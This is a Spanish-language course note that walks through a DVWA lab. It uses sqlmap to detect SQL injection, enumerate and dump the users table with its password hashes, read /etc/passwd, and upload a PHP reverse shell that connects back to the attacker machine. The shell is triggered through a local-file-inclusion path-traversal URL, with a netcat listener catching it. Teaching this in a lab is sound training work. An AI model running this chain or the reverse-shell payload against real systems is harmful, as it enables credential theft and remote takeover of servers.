---
title: SQL map
modulo: M3 - Ataques Web
fecha: 2025-07-15
vm: https://drive.google.com/drive/folders/17_s4xiWqbh-mRCX5FazMp-pEpokJBE70
layout: apunte
slug: 2025-07-15-sql-map
---
# 📋Primeros pasos
## 1. Test SQLmap (detección)
```bash
sqlmap -u "http://10.0.2.X/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=43f0xxx; security=low"
```

🔹 **Donde**:
- `-u`: Especifica la URL con el parámetro vulnerable (*id* en este caso)
- `--cookie`: Es la sesión para que no nos saque de DVWA, donde:
	- `PHPSESSID=43f0xxx → Es el ID de sesión activa.
	- `security=low` → Nivel de seguridad de DVWA, necesario para mantener la vulnerabilidad activa

O bien,
```bash
sqlmap -r request.txt
```

🔹 **Donde** `request.txt` es el archivo con la información de la request obtenida con BurpSuite.

**RESULTADO ESPERADO**
👉 **Confirmar la vulnerabilidad SQLi y obtener información básica**.  
Este es **el primer escaneo**, donde SQLmap:
- Envía **payloads de prueba** (`AND 1=1`, `UNION SELECT`, etc.).
- Detecta si el parámetro `id` es **vulnerable**.
- Identifica **el motor de base de datos** (en este caso, MySQL).

>[!info] Nota:
>Si en algun punto, nos pregunta `got a 302 redirect to 'http://10.0.2.17/dvwa/login.php'. Do you want to follow? [Y/n]` hay que darle a 'n', ya que se podría perder la sesión

## 2. Enumerar las bases de datos
```bash
sqlmap -u "http://10.0.2.X/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=43f0xxx; security=low" --dbs
```

O bien,
```bash
sqlmap -r request.txt --dbs
```

🔹 **Donde**:
- `--dbs`: Es la *flag* que indica al sqlmap que queremos obtener las bases de datos existentes

**RESULTADO ESPERADO**
👉 **Lista con las bases de datos existentes** (dvwa, information_schema, metasploit, mysql, etc)

## 3. Listar tablas de DVWA
```bash
sqlmap -u "http://10.0.2.X/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=43f0xxx; security=low" -D dvwa --tables
```

O bien,
```bash
sqlmap -r request.txt -D dvwa --tables
```

🔹 **Donde**:
- **`-D`**: Especifica la **base de datos** (*dvwa* en este caso)
- **`--tables`**: Le pedimos que **enumere todas las tablas** dentro de esa base de datos.

**RESULTADO ESPERADO**
👉 **Lista de tablas existentes en la base de datos dvwa**

## 4. Obtener usuarios y contraseñas
```bash
sqlmap -u "http://10.0.2.X/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=43f0xxx; security=low" -D dvwa -T users --dump
```

🔹 **Donde**:
- `-T` Especifica la tabla en la base de datos (en este caso, *users*)
- `--dump` Indica a SQLmap que **extraiga todo el contenido** de esa tabla.

**RESULTADO ESPERADO**
👉 **Tabla sql con los datos que almacena**, y, particularmente en este caso, el hash de las contraseñas (con su de-hash si se activó la opción)

>[!info] Observaciones:
>Cuando pregunta `do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] ` nos da la opción de almacenar los *hashes* en un archivo, en caso de querer trabajar aparte con ellos
>Cuando pregunta `do you want to crack them via a dictionary-based attack? [Y/n/q] ` nos da la opción de romper las contraseñas utilizando un diccionario
>

## 5. Identificar usuarios de la base de datos
**🟣1.1 Identificarse a sí mismo**
```bash
sqlmap -u "http://10.0.2.X/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=43f0xxx; security=low" --current-user
```

O bien,
```bash
sqlmap -r request.txt --current-user
```

🔹 **Donde**:
- `--current-user`: Le pide a SQLmap que identifique al usuario **de la base de datos** con el que se ejecutan las consultas

**RESULTADO ESPERADO**
👉**Algo como**
>[INFO] fetching current user
>current user: 'root@localhost'


**🟣1.2 ¿Somos admin?**
```bash
sqlmap -u "http://10.0.2.X/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=43f0xxx; security=low" --is-dba
```

O bien,
```bash
sqlmap -r request.txt --is-dba
```

🔹 **Donde**:
- `--is-dba`: Pregunta directamente si el **usuario actual de la base de datos** tiene el privilegio **DBA (Administrador de Base de Datos)**, en otras palabras: **¿tenemos control total sobre el motor de la base de datos?**

**RESULTADO ESPERADO**
👉**Algo como**
>[INFO] fetching current user
>current user is DBA: True


**🟣1.3 Lista de privilegios**
```bash
sqlmap -u "http://10.0.2.X/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=43f0xxx; security=low" --privileges
```

O bien,
```bash
sqlmap -r request.txt --privileges
```

🔹 **Donde**:
- `--privileges`: Le pide a SQLmap que identifique los **privilegios del usuario DE LA BASE DE DATOS en la base de datos**

**RESULTADO ESPERADO**
👉**Lista de usuarios de la base de datos** junto con los respectivos permisos. Nos interesa que para el usuario que vimos en el punto 1.1 veamos el privilegio `FILE`. El privilegio `FILE` de MySQL permite **leer y escribir archivos** directamente en el sistema Linux, dentro de los **límites** de los permisos del usuario `mysql` que ejecuta el servicio.

# 🐚Reverse shell
## 1. Preparar payload (la reverse shell)
Crear un PHP en la Kali:
```php
<?php
set_time_limit (0);
$ip = '10.0.2.X';  // IP de la Kali
$port = 4444; // Puerto donde escuchará la Kali
$sock = fsockopen($ip, $port); // Crea un socket con la IP y puerto especificados
$proc = proc_open('/bin/sh', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); //Abre el socket
?>
```
Guardar como `shell.php`.

## 2. Subir la webshell con SQLmap
**🟠2.1 Comprobar privilegio FILE**
```bash
sqlmap -u "http://10.0.2.x/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=43f0xxx; security=low" --file-read="/etc/passwd"
```

O bien,
```bash
sqlmap -r request.txt --file-read="/etc/passwd" --file-read="/etc/passwd"
```

🔹**Donde**:
- `--file-read`: Le indica a SQLmap que lea un archivo dentro del sistema de archivos **DEL SERVIDOR** (No confundir con la base de datos)
- `/etc/passwd`: Es un archivo típico de sistemas Linux, contiene una lista de los usuarios del sistema.

**RESULTADO ESPERADO**
👉**Si en efecto, tenemos el privilegio `FILE`**, en efecto, al ejecutar este comando nos descargará el contenido, veremos algo como
> files saved to:
>[\*] /home/kali/.local/share/sqlmap/output/10.0.2.X/files/\_etc_passwd (size differs from remote file)

El cual, de hecho, se puede consultar
```bash
cat /home/kali/.local/share/sqlmap/output/10.0.2.X/files/_etc_passwd
```

>[!question] ¿Cómo saber dónde subir la shell reversa?:
>Al usar comandos como `--file-read` o `--file-write`, la instrucción se ejecuta por **el proceso del servidor MySQL** el cual corre en el **sistema operativo con un usuario específico**, que normalmente es *mysql* en Linux. Entonces, estamos limitados a las carpetas donde el usuario *mysql* tiene permisos de escritura
>


**🟠2.2Subir shell:**
```bash
sqlmap -u "http://10.0.2.x/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
--cookie="PHPSESSID=43f0xxx; security=low" \
--file-write="/ruta/absoluta/a/shell.php" \
--file-dest="/var/lib/mysql/hacked.php"
```

🔹**Donde**:
- `--file-write`: Es el comando para **subir** un archivo. Aquí especificamos la ruta absoluta del archivo `shell.php` creado anteriormente
- `--file-dest`: Indica el **destino** en el servidor donde se subirá el archivo

>[!question] ¿Por qué /var/lib/mysql/?:
>🔹El usuario del sistema operativo que ejecuta MySQL (`mysql`) tiene permisos de escritura ahí.
>🔹Intentar escribir en otras rutas como `/var/www/html/` fallaron previamente porque `mysql` no tiene permisos allí.
>🔹Aunque la carpeta no es accesible directamente vía web, se puede **ejecutar usando un LFI (Local File Inclusion)**.

**RESULTADO ESPERADO**
👉**Si todo sale bien**,veremos algo como
>[INFO] the remote file '/var/lib/mysql/hacked.php' is larger (189 B) than the local file '/home/kali/shell.php' (188B)

## 3. Ejecución de la reverse shell
🟢**3.1 Preparar el listener**
Utilizando Netcat, abrimos el puerto de escucha en la Kali. **Debe coincidir con el puerto escrito en `shell.php`**
```bash
nc -lvnp 4444
```

🔹**Donde**:
- `-l`: Modo escucha
- `-v`: Modo verbose (nos muestra las conexiones)
- `-n`: No hace resolución DNS
- `-p`: Puerto

🟢**3.2 Activar la shell mediante LFI**
Ya que la shell se guardó en `/var/lib/mysql/hacked.php`, la ejecutamos **incluyéndola en la aplicación web** vulnerable a **LFI (Local File Inclusion)**.
Para ello, desde el navegador hay que acceder a:
`http://10.0.2.x/dvwa/vulnerabilities/fi/?page=../../../../../../var/lib/mysql/hacked.php`

🔹Donde:
- `/fi/`: Es el recurso web vulnerable a LFI
- `page`: Es el atributo desde donde nos dirigimos a la reverse shell

**RESULTADO ESPERADO**
👉**Si todo sale bien**, en la terminal Kali veremos algo como:
> listening on [any] 4444 ...
>connect to [IP_KALI] from (UNKNOWN) [IP_DVWA] 41889

**🎉 Una vez logrado esto, ya podremos ejecutar comandos desde la terminal**
